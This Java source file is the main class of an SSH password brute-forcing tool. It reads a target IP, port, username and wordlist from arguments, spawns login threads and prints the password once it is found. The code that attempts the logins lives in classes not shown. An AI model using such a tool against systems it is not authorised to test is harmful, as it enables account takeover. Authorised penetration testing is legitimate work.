package solirsayple.sshbrutewj;



/* ##---------IMPORTS---------#*/

import java.io.IOException;
import java.io.FileInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.Time;

/* ##---------IMPORTS---------#*/

public class Main
{
    /* This will probably be useful in the future*/
    // private static List<Thread> threads = new LinkedList<Thread>();

    private static Statistics statistics = new Statistics();

    private static void loadwordlist() throws IOException {
        FileInputStream fstream = new FileInputStream(ProgramSettings.wordlist);
        BufferedReader br = new BufferedReader(new InputStreamReader(fstream));

        String line;

        while ((line = br.readLine()) != null)   {
            ProgramSettings.queue.add(line);
        }

        fstream.close();
    }

    public static void lockAllThreads() {
        ProgramSettings.lock.lock();
    }
    
    // this is just the same thing from the python script. I thought it looked
    // cool :~) - AyPle
    public static void outputText(String color, String text) {
        System.out.println(color + "[+] " + text + Colors.RESET);
    }

    // this doesn't work too well but would be cool to implement.
    public static void outputSameLineText(String color, String text) {
        System.out.print(color + "\r[+] " + text + "\r                            ");
    }
    
    private static void printOutStatistics() {
        statistics.end();
        TimeResult timeresult = statistics.timeResult();
        outputText(Colors.CYAN, "Days: " + timeresult.day);
        outputText(Colors.CYAN, "Hours: " + timeresult.hour);
        outputText(Colors.CYAN, "Minutes: " + timeresult.minute);
        outputText(Colors.CYAN, "Seconds: " + timeresult.second);
        outputText(Colors.CYAN, "Miliseconds: " + timeresult.milisecond);
        outputText(Colors.CYAN, "Attempts: " + Statistics.attemptsCount);
        onProgramExit();
    }

    public static void onPasswordCorrect(String password) {
        outputText(Colors.GREEN, "Password found: " + password);
        printOutStatistics();
        onProgramExit();
    }

    public static void onProgramExit() {
        System.exit(0);
    }

    private static void instansiateThreads() throws InterruptedException {
        for (int i = 0; i < ProgramSettings.threadCount; i++) {
            // outputSameLineText(Colors.CYAN, "Created thread " + Integer.toString(i) + " out of " + Integer.toString(ProgramSettings.threadCount));
            SSHThread tr = new SSHThread();

            ProgramSettings.executor.execute(tr);
        }
    }


    public static void main( String[] args )
    {
        ProgramSettings.ip = args[0];
        ProgramSettings.port = Integer.valueOf(args[1]);
        ProgramSettings.username = args[2];
        ProgramSettings.wordlist = args[3];
        ProgramSettings.threadCount = Integer.valueOf(args[4]);
        ProgramSettings.verboseMode = Boolean.valueOf(args[5]);
        ProgramSettings.timeout = Integer.valueOf(args[6]);

        SSHutils.performCheck();

        outputText(Colors.GREEN, "Starting timer...");
        statistics.start();

        
        
        try{
            loadwordlist();
            instansiateThreads();
        } catch(Exception j){
            System.out.print(j);
        }
    }
}
